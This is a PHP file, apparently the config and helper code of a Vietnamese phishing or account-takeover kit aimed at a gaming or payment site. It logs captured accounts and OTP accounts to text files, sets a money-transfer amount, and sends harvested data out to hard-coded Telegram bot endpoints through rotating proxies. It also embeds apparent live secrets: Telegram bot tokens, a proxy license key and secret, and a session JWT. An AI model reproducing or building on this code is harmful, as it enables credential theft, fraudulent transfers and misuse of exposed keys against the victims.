<?php
$fp1 = fopen('list1asdgg4g4gh4cc11212.txt', 'a+'); // lưu acc về file .txt
$loginotp = fopen('llist1asdgg4g4gh4cc11212.txt', 'a+');  // lưu acc có otp về file .txt

$luu_otp = 0;  // bật tắt login otp 
$bay_bank =1;
$tokenbank = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiI1NTE2ODgxOCIsInVuaXF1ZV9uYW1lIjpbIntcIkFjY291bnRJRFwiOjU1MTY4ODE4LFwiVXNlcm5hbWVcIjpcImdhbWVhbzg4ODg4ODhcIixcIk5pY2tuYW1lXCI6XCJbRzg4XXBheWJhbmtqc1wiLFwiQXZhdGFySURcIjpcIjBcIixcIlNlc3Npb25Ub2tlblwiOlwiNmNmN2NkZDIzMmJhMjJjMWU2NTViNWQyZGU1OTY3ZThcIixcIlNlY3VyaXR5VG9rZW5cIjpcIjE2MjAxNDI1MzIuMmI1ZGVhNTNlZDg3Y2ViMGZmMDgyYzMzMGI2OGUyNTVcIixcIlNvdXJjZUlEXCI6MSxcIkNsaWVudElQXCI6XCI0Mi4xMTMuMjI1LjIyMlwiLFwiUG9ydGFsSURcIjoxLFwiT3JpZ2luTmlja25hbWVcIjpcInBheWJhbmtqc1wiLFwiUmVkaXJlY3RUeXBlXCI6MSxcIkxvZ2luRGF0ZVwiOlwiMjAyMS0wNS0wNFQxNTozNTozMi4xNDgxNzYzKzA3OjAwXCJ9IiwiZ2FtZWFvODg4ODg4OCJdLCJIYXNBZG1pblJpZ2h0cyI6Ik4iLCJzdWIiOiJnYW1lYW84ODg4ODg4IiwianRpIjoiOWFiM2E2ODAtNjQwZS00YzRlLTkyOWUtM2UwMzFlZmQ5OGYxIiwiaWF0IjoxNjIwMTE3MzMyLCJuYmYiOjE2MjAxMTczMzIsImV4cCI6MTYyMDEzNTMzMiwiaXNzIjoid2ViQXBpIiwiYXVkIjoiaHR0cDovL2dhbXZpcC5jb20vIn0.0Zt4dlILHeMPgFp1gHLNsDYtlgFJwI3OVeCyo7qHKDc';
$luu_otp_chuyen_khoan = 0; // 1 bật chuyển khoản (chưa dùng được)
$mo_ket = 1;
$sotienchuyenkhoan = '500000'; // chỉnh số tiền chuyển khoản
$proxy = proxy();





// gữi thông tin về telegram
function send_telegram($message) {
	$message = urlencode($message);
	file_get_contents('https://api.telegram.org/bot1698347134:AAFuXkzAfE-0q89KY2iNSb6hK7SVXJgAwRM/sendMessage?chat_id=-418265377&text='.$message);
}
function send_telegram_trans($message) {
	$message = urlencode($message);
	file_get_contents('https://api.telegram.org/bot1696327675:AAGyI0O8dB11Kd67ZZuejQsD7nw07XaJXPA/sendMessage?chat_id=-512208078&text='.$message);
}
// lấy proxy
function proxy() {
$license = 'P032F4CE5FEEE2BEF';
    $secret = 'DwhFFui0YwIfPqT9lsoCJ';
    $time = time();
   // $iso = 'VN';  // lấy proxy việt nam
$queries = [
    'license' => $license,
    'time' => $time,
     'cnt' => 1, // lấy số lượng 1 proxy
   //  'iso' => $iso,
];

$queries['sign'] = md5($license . $time . $secret);

$getProxyApiurl = 'https://api.ttproxy.com/v1/obtain?' . http_build_query($queries);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $getProxyApiurl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
$resData = json_decode($response, true);
$proxy = $resData['data']['proxies'][0];
return $proxy;
}
?>